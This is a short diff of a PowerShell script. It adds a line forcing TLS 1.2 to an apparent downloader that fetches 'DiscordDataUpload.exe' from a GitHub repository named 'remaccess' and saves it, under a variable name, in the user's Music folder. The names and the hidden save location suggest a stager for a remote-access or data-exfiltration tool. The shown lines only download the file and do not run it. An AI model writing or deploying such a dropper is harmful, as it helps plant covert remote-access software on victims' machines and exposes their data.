@@ -1,3 +1,4 @@
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $url = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/DiscordDataUpload.exe"
 $exepath = Join-Path $env:USERPROFILE "Music\$Name.exe"
 Invoke-WebRequest -Uri $url -OutFile $exepath
